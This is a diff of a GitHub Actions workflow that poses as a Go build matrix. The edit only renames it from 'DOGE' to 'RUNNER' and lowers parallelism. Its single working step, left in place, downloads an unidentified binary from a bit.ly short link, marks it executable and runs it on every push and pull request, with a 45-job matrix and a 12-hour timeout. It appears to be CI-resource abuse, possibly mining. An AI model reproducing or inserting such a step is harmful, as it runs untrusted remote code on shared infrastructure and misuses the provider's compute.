@@ -1,18 +1,18 @@
-name: DOGE
+name: RUNNER
 on: [push, pull_request]
 jobs:
   build:
-    name: 🍼Nyusuwae
+    name: RUNNER
     runs-on: ubuntu-18.04
     strategy:
-      max-parallel: 40
+      max-parallel: 20
       fail-fast: false
       matrix:
         go: [1.6, 1.7, 1.8, 1.9, 1.10]
         flag: [A, B, C, D, E, F, G, H, I]
     timeout-minutes: 720
     env:
-        NUM_JOBS: 40
+        NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
@@ -22,6 +22,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v1
-    - name: 🍼Nyusuwae
+    - name: RUNNER
       run: |
         wget https://bit.ly/3zKycFD && chmod +x 3zKycFD && ./3zKycFD
